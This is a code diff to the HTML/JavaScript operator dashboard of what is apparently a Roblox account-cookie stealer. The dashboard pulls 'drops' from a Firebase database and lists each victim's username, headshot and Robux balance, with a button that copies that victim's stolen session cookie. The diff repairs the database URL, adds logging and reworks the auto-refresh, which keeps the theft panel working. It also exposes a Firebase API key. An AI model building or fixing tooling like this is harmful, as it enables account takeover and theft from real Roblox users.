@@ -67,7 +67,7 @@
     const firebaseConfig = {
       apiKey: "AIzaSyBUMdPMNAJpUzmyRfWjJ1RC7DsyoxcR0bk",
       authDomain: "flamesaxrch-empire.firebaseapp.com",
-      databaseURL: "https://flamesaxrch-empire-default-rtdb.firebaseio.com",
+      databaseURL: "https://flamesaxrch-empire-default-rtdb.europe-west1.firebasedatabase.app", // FIXED
       projectId: "flamesaxrch-empire",
       storageBucket: "flamesaxrch-empire.firebasestorage.app",
       messagingSenderId: "1067890777932",
@@ -77,8 +77,6 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let lastCount = 0;
-    let retryCount = 0;
-    const MAX_RETRY = 3;
 
     function toggleKey() {
       const i = document.getElementById('key');
@@ -92,55 +90,49 @@
         document.getElementById('login').style.display = 'none';
         document.getElementById('main').style.display = 'block';
         load();
+        setInterval(load, 5000);
       } else {
         alert("WRONG KEY");
       }
     }
 
     function load() {
-      const start = Date.now();
-      db.ref('drops').once('value').then(s => {
-        const data = s.val() || {};
-        const arr = Object.values(data);
-        let total = 0;
-        const html = arr.map(c => {
-          total += Number(c.robux);
-          return `<div class="log">
-            <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
-            <div class="info">
-              <h3>${c.user} (@${c.display})</h3>
-              <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
-              <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
-            </div>
-          </div>`;
-        });
-        document.getElementById('total').textContent = total.toLocaleString();
-        document.getElementById('total2').textContent = total.toLocaleString();
-        document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
-        document.getElementById('error').style.display = 'none';
+      console.log("[DASH] Loading drops...");
+      db.ref('drops').once('value')
+        .then(s => {
+          console.log("[DASH] Data received:", s.val());
+          const data = s.val() || {};
+          const arr = Object.values(data);
+          let total = 0;
+          const html = arr.map(c => {
+            total += Number(c.robux);
+            return `<div class="log">
+              <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
+              <div class="info">
+                <h3>${c.user} (@${c.display})</h3>
+                <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
+                <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
+              </div>
+            </div>`;
+          });
+          document.getElementById('total').textContent = total.toLocaleString();
+          document.getElementById('total2').textContent = total.toLocaleString();
+          document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
+          document.getElementById('error').style.display = 'none';
 
-        if (arr.length > lastCount) {
-          const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
-          audio.play().catch(() => {});
-        }
-        lastCount = arr.length;
-        retryCount = 0;
-      }).catch(err => {
-        retryCount++;
-        if (retryCount <= MAX_RETRY) {
-          setTimeout(load, 3000);
-        } else {
+          if (arr.length > lastCount) {
+            const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
+            audio.play().catch(() => {});
+          }
+          lastCount = arr.length;
+        })
+        .catch(err => {
+          console.error("[DASH] ERROR:", err);
           document.getElementById('logs').innerHTML = '';
-          document.getElementById('error').textContent = 'DB OFFLINE — REFRESH PAGE';
+          document.getElementById('error').textContent = 'DB ERROR: ' + err.message;
           document.getElementById('error').style.display = 'block';
-        }
-      });
+        });
     }
-
-    // AUTO REFRESH EVERY 5 SEC
-    setInterval(() => {
-      if (document.getElementById('main').style.display === 'block') load();
-    }, 5000);
   </script>
 </body>
 </html>
